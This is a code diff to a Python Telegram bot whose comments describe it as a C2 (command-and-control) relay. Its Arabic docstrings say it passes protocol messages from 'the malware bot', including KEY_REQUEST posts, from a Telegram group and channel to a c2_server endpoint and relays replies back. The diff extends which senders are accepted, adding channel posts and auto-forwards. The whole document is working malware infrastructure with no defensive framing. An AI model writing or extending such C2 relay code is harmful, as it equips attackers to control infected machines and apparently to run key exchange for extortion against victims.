@@ -4,8 +4,8 @@ C2 Telegram Relay Bot — وسيط فقط
 لا يستقبل أوامر من البشر ولا من الخاص.
 
 • الداشبورد / السيرفر يبعتوا للشات عبر c2_server مباشرة (HTTP → Telegram API).
-• هذا البوت يعمل polling لاستقبال رسائل الجروب من *بوتات فقط* (مثل بوت المالوير)،
-  ثم يمرّر النص إلى c2_server (/internal/tg_message) ويبعت الرد على القناة لو مطلوب.
+• هذا البوت يعمل polling للجروب المحدد وللقناة (البوت لازم يكون أدمن في القناة).
+• في الجروب: يمرّر رسائل البروتوكول القادمة من *بوت* أو من *منشور القناة المنسوخ للمناقشة*.
 """
 
 import sys
@@ -16,6 +16,7 @@ sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
 import json
 import requests
 from telegram import Update
+from telegram.constants import ChatType
 from telegram.ext import ApplicationBuilder, MessageHandler, filters, ContextTypes
 
 # ── Config ────────────────────────────────────────────────────────────
@@ -44,19 +45,46 @@ def _load_token() -> str:
     return os.environ.get("TELEGRAM_BOT_TOKEN", "")
 
 
-async def handle_c2_group_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """رسائل الجروب من بوتات فقط → C2 → رد على القناة إن وُجد."""
-    if not update.message or not update.message.text:
-        return
-    if str(update.effective_chat.id) != C2_GROUP_ID:
-        return
-
+def _allowed_protocol_sender(update: Update) -> bool:
+    """
+    في الجروب: قبول من بوت المالوير، أو منشور القناة في مجموعة المناقشة
+    (sender_chat = قناة / is_automatic_forward).
+    """
+    msg = update.effective_message
+    if not msg:
+        return False
     user = update.effective_user
-    if not user or not user.is_bot:
-        # بشر أو رسائل بدون مرسل بوت — تجاهل بالكامل
+    if user is not None and user.is_bot:
+        return True
+    sc = getattr(msg, "sender_chat", None)
+    if sc is not None:
+        try:
+            if sc.type == ChatType.CHANNEL:
+                return True
+        except Exception:
+            pass
+        if getattr(sc, "type", None) == "channel":
+            return True
+    if getattr(msg, "is_automatic_forward", False):
+        return True
+    return False
+
+
+async def handle_c2_protocol(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """جروب مناقشة أو القناة → يمرّر نص البروتوكول إلى C2."""
+    msg = update.effective_message
+    if not msg or not msg.text:
         return
 
-    text = update.message.text.strip()
+    cid = str(msg.chat.id)
+
+    if cid == C2_GROUP_ID:
+        if not _allowed_protocol_sender(update):
+            return
+    elif cid != C2_CHANNEL_ID:
+        return
+
+    text = msg.text.strip()
     if not any(text.startswith(p) for p in _C2_PREFIXES):
         return
 
@@ -71,7 +99,7 @@ async def handle_c2_group_message(update: Update, context: ContextTypes.DEFAULT_
         if reply:
             await context.bot.send_message(chat_id=int(C2_CHANNEL_ID), text=reply)
     except Exception as e:
-        print(f"[C2 group handler] error: {e}")
+        print(f"[C2 protocol handler] error: {e}")
 
 
 async def error_handler(update, context):
@@ -93,14 +121,22 @@ if __name__ == "__main__":
         .build()
     )
 
+    # القناة: KEY_REQUEST وغيره يصل كـ channel_post إذا كان البوت أدمن في القناة
+    app.add_handler(
+        MessageHandler(
+            filters.TEXT & filters.Chat(chat_id=int(C2_CHANNEL_ID)),
+            handle_c2_protocol,
+        )
+    )
+    # الجروب (أو مجموعة مناقشة القناة): يقبل مرسل بوت أو منشور القناة المعاد
     app.add_handler(
         MessageHandler(
             filters.TEXT & filters.Chat(chat_id=int(C2_GROUP_ID)),
-            handle_c2_group_message,
+            handle_c2_protocol,
         )
     )
     app.add_error_handler(error_handler)
 
-    print("🤖 C2 Relay Bot — bots-only group relay (no human commands)")
+    print("🤖 C2 Relay — جروب + قناة، بروتوكول من بوت / قناة مرتبطة فقط في الجروب")
     print(f"   C2 Server: {C2_URL}")
     app.run_polling()
